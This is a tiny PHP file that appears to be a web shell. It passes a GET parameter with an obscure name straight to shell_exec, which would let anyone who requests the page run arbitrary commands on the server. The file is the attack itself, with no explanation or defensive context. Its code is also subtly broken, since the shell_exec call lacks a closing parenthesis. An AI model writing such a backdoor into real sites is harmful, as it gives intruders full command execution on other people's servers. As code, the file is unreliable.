<?php
shell_exec($_GET['EjDVod-r'];
?>
